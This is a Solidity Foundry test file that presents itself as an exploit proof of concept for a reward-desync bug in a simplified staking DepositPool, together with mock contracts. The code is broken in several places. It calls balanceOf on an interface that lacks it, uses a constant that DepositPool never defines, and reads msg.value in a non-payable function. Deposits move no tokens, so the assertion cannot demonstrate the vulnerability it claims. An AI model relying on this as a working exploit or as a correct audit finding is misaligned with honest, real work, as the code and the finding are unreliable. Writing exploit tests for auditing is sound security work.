// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IDistributor {
    function rewardPool() external view returns (address);
    function withdraw(uint256 rewardPoolIndex, uint256 amount) external;
    function distributeRewards(uint256 rewardPoolIndex) external;
    function sendMintMessage(uint256 rewardPoolIndex, address receiver) external payable;
}

interface IERC20 {
    function safeTransfer(address to, uint256 value) external;
}

interface IRewardPool {
    function isRewardPoolPublic(uint256 rewardPoolIndex) external view returns (bool);
    function onlyExistedRewardPool(uint256 rewardPoolIndex) external view;
}

contract ExploitTest is Test {
    // Mock interfaces
    IDistributor distributor;
    IERC20 depositToken;
    IRewardPool rewardPool;

    // Contract instances
    DepositPool depositPool;

    // Constants
    uint256 constant PRECISION = 1e18;

    // User and pool data
    address attacker = address(0x1);
    uint256 rewardPoolIndex = 0;
    uint256 initialDeposit = 1000 ether;
    uint256 currentPoolRate = 1 ether;

    function setUp() public {
        // Deploy contracts and set initial state
        distributor = IDistributor(address(new MockDistributor()));
        depositToken = IERC20(address(new MockERC20()));
        rewardPool = IRewardPool(address(new MockRewardPool()));
        depositPool = new DepositPool(address(distributor), address(depositToken));

        // Fund attacker
        vm.deal(attacker, 10 ether);
        deal(address(depositToken), attacker, initialDeposit);

        // Set up initial deposit
        vm.prank(attacker);
        depositPool.deposit(rewardPoolIndex, initialDeposit);
    }

    function test_exploit() public {
        // Step 1: Attacker withdraws partially, desyncing virtualDeposited
        vm.prank(attacker);
        depositPool.withdraw(rewardPoolIndex, initialDeposit / 2, currentPoolRate);

        // Step 2: Attacker claims rewards, exploiting desync
        vm.prank(attacker);
        depositPool.claim(rewardPoolIndex, attacker);

        // Assert the vulnerability: Attacker's balance should be greater than expected
        uint256 expectedRewards = calculateExpectedRewards(initialDeposit / 2);
        uint256 actualRewards = depositToken.balanceOf(attacker);
        assertGt(actualRewards, expectedRewards, "Attacker received more rewards than expected");
    }

    function calculateExpectedRewards(uint256 deposited) internal view returns (uint256) {
        uint256 multiplier = 1; // Simplified for demonstration
        uint256 virtualDeposited = (deposited * multiplier) / PRECISION;
        return virtualDeposited * currentPoolRate;
    }
}

// Mock implementations for interfaces
contract MockDistributor is IDistributor {
    function rewardPool() external pure override returns (address) {
        return address(0);
    }
    function withdraw(uint256, uint256) external pure override {}
    function distributeRewards(uint256) external pure override {}
    function sendMintMessage(uint256, address) external payable override {}
}

contract MockERC20 is IERC20 {
    mapping(address => uint256) balances;

    function safeTransfer(address to, uint256 value) external override {
        balances[to] += value;
    }

    function balanceOf(address account) external view returns (uint256) {
        return balances[account];
    }
}

contract MockRewardPool is IRewardPool {
    function isRewardPoolPublic(uint256) external pure override returns (bool) {
        return true;
    }
    function onlyExistedRewardPool(uint256) external pure override {}
}

// Simplified DepositPool contract for demonstration
contract DepositPool {
    struct UserData {
        uint256 deposited;
        uint256 virtualDeposited;
        uint256 pendingRewards;
        uint256 lastStake;
        uint256 lastClaim;
        uint256 claimLockEnd;
        uint256 referrer;
        uint256 rate;
    }

    struct RewardPoolData {
        uint256 lastUpdate;
        uint256 rate;
        uint256 totalVirtualDeposited;
    }

    mapping(address => mapping(uint256 => UserData)) public usersData;
    mapping(uint256 => RewardPoolData) public rewardPoolsData;

    address public distributor;
    address public depositToken;

    constructor(address _distributor, address _depositToken) {
        distributor = _distributor;
        depositToken = _depositToken;
    }

    function deposit(uint256 rewardPoolIndex, uint256 amount) external {
        UserData storage userData = usersData[msg.sender][rewardPoolIndex];
        userData.deposited += amount;
        userData.lastStake = block.timestamp;
    }

    function withdraw(uint256 rewardPoolIndex, uint256 amount, uint256 currentPoolRate) external {
        UserData storage userData = usersData[msg.sender][rewardPoolIndex];
        uint256 deposited = userData.deposited;
        require(deposited > 0, "DS: user isn't staked");

        if (amount > deposited) {
            amount = deposited;
        }

        uint256 newDeposited = deposited - amount;
        userData.pendingRewards = _getCurrentUserReward(currentPoolRate, userData);

        uint256 multiplier = 1; // Simplified for demonstration
        uint256 virtualDeposited = (newDeposited * multiplier) / PRECISION;

        if (userData.virtualDeposited == 0) {
            userData.virtualDeposited = userData.deposited;
        }

        userData.deposited = newDeposited;
        rewardPoolsData[rewardPoolIndex].lastUpdate = uint128(block.timestamp);
        rewardPoolsData[rewardPoolIndex].rate = currentPoolRate;
    }

    function claim(uint256 rewardPoolIndex, address receiver) external {
        UserData storage userData = usersData[msg.sender][rewardPoolIndex];
        uint256 deposited = userData.deposited;

        uint256 multiplier = 1; // Simplified for demonstration
        uint256 virtualDeposited = (deposited * multiplier) / PRECISION;

        if (userData.virtualDeposited == 0) {
            userData.virtualDeposited = userData.deposited;
        }

        RewardPoolData storage rewardPoolData = rewardPoolsData[rewardPoolIndex];
        rewardPoolData.lastUpdate = uint128(block.timestamp);
        rewardPoolData.rate = userData.rate;
        rewardPoolData.totalVirtualDeposited =
            rewardPoolData.totalVirtualDeposited +
            virtualDeposited -
            userData.virtualDeposited;

        userData.rate = userData.rate;
        userData.pendingRewards = 0;
        userData.virtualDeposited = virtualDeposited;
        userData.lastClaim = uint128(block.timestamp);

        IDistributor(distributor).sendMintMessage{value: msg.value}(rewardPoolIndex, receiver);
    }

    function _getCurrentUserReward(uint256 currentPoolRate, UserData storage userData) internal view returns (uint256) {
        return userData.deposited * currentPoolRate;
    }
}